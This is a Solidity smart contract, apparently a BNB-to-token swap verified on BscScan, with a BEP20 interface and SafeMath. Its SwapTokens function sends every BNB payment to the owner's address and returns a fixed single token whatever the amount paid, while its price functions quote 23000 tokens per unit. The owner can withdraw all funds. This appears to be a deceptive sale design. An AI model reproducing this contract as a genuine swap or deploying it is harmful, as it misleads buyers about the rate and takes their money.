/**
 *Submitted for verification at BscScan.com on 2023-03-01
*/

/**
 *Submitted for verification at BscScan.com on 2022-12-26
*/

// SPDX-License-Identifier: MIT 
pragma solidity 0.4.25;



interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }

interface BEP20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract SwapContract {
    address devAddress;
    BEP20 TokenAddress;
    using SafeMath for uint256;
    mapping(address=>bool) whiteList;
    uint256 public priceforSolachain=23000*1e18;
    bool public isPublicSale;
    
    event Swap(address indexed user,uint amount,uint newtokens, uint _time);  
    
    constructor(BEP20 _Tokenaddress) public{
        devAddress=msg.sender;
        TokenAddress=_Tokenaddress;
    }
    
    function SwapTokens() public payable
    {
        require(msg.value>0,"invalid amount");
         uint256 amount=msg.value;
        devAddress.transfer(msg.value);
        uint256 token = 1;
        tokenTransfer(msg.sender,token.mul(1e8));
        emit Swap(msg.sender,amount,token.mul(1e8),now);
    }
    
    function changedevAddress(address _devAddress) public
    {
        require(msg.sender==devAddress,"Only owner");
        devAddress=_devAddress;
    }
    


      function getUsdttoTokenValue()external view returns(uint256) {
        return priceforSolachain;
    }


      function convertBnbToToken(uint256 amount) external view returns(uint256 tokens)
    {
        uint256 _amountUsdt=amount;
        return (_amountUsdt.mul(priceforSolachain).div(1e18));
    }
    function setPriceForToken(uint _amount) public 
    {
        require(msg.sender==devAddress,"Only owner");
        priceforSolachain=_amount;
    }
    
     function BalanceOfTokenInContract()public view returns (uint256){
        return BEP20(TokenAddress).balanceOf(address(this));
    }
    
    function tokenTransfer(address to, uint256 _amount) internal {
         uint256 tokenBal = BalanceOfTokenInContract();
        _amount=_amount;
        require(tokenBal >= _amount,"Token balance is low");
       
            require(BEP20(TokenAddress).transfer(to, _amount));
         
    }
    
    function TokenWithdraw(address toAddress,uint256 _amount) public{
        require(msg.sender==devAddress,"Invalid user");
        require(BEP20(TokenAddress).transfer(toAddress, _amount));
    }
    
    function bnbWithdraw(address toAddress,uint256 _amount) public
    {
        require(msg.sender==devAddress,"Invalid user");

         uint256 contractBalance = address(this).balance;
        require(contractBalance >= _amount,"Contract balance is low");
          toAddress.transfer(_amount);
    }

    

   
    
}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}